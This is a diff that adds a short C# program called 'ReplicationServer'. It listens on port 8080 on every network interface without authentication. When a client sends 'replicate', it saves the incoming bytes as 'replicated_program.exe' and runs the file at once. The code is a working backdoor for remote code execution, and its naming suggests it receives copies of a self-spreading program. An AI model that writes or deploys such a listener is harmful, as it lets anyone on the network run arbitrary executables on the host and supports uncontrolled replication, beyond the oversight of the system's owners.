@@ -1,0 +1,71 @@
+using System;
+using System.IO;
+using System.Net;
+using System.Net.Sockets;
+using System.Text;
+using System.Threading;
+
+namespace ReplicationServer
+{
+    class Program
+    {
+        private static readonly int PORT = 8080;
+
+        static void Main(string[] args)
+        {
+            // Create a new server socket
+            TcpListener server = new TcpListener(IPAddress.Any, PORT);
+            server.Start();
+
+            // Start listening for incoming connections
+            Console.WriteLine("Listening for connections...");
+            while (true)
+            {
+                // Accept an incoming connection
+                TcpClient client = server.AcceptTcpClient();
+                Console.WriteLine("Received connection from " + client.Client.RemoteEndPoint);
+
+                // Start a new thread to handle the connection
+                Thread thread = new Thread(new ParameterizedThreadStart(HandleConnection));
+                thread.Start(client);
+            }
+        }
+
+        private static void HandleConnection(object obj)
+        {
+            TcpClient client = (TcpClient)obj;
+
+            // Get a stream to read and write data
+            NetworkStream stream = client.GetStream();
+
+            // Read the message from the client
+            byte[] buffer = new byte[4096];
+            int bytesReceived = stream.Read(buffer, 0, buffer.Length);
+            string message = Encoding.UTF8.GetString(buffer, 0, bytesReceived);
+            Console.WriteLine("Received message: " + message);
+
+            if (message == "replicate")
+            {
+                // Read the file from the stream
+                MemoryStream fileStream = new MemoryStream();
+                while (true)
+                {
+                    bytesReceived = stream.Read(buffer, 0, buffer.Length);
+                    if (bytesReceived == 0) break;
+                    fileStream.Write(buffer, 0, bytesReceived);
+                }
+
+                // Save the file to disk
+                string filename = "replicated_program.exe";
+                File.WriteAllBytes(filename, fileStream.ToArray());
+                Console.WriteLine("Saved file to disk: " + filename);
+
+                // Execute the file
+                System.Diagnostics.Process.Start(filename);
+            }
+
+            // Close the connection
+            client.Close();
+        }
+    }
+}
